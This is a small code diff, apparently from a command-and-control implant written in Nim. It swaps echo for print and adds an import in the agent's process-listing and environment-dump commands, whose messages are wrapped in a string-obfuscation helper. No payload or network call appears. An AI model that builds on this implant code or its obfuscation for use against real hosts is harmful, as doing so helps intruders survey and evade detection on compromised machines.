@@ -38,6 +38,7 @@ when defined(agent):
 
     import winim
     import os, strutils, sequtils, strformat, tables, algorithm
+    import ../agent/core/io
     import ../agent/protocol/result
     import ../common/utils
 
@@ -51,7 +52,7 @@ when defined(agent):
 
     proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
         
-        echo protect("   [>] Listing running processes.")
+        print protect("   [>] Listing running processes.")
         
         try: 
             var processes: seq[DWORD] = @[]
@@ -125,7 +126,7 @@ when defined(agent):
 
     proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 
 
-        echo protect("   [>] Displaying environment variables.")
+        print protect("   [>] Displaying environment variables.")
 
         try: 
             var output: string = ""
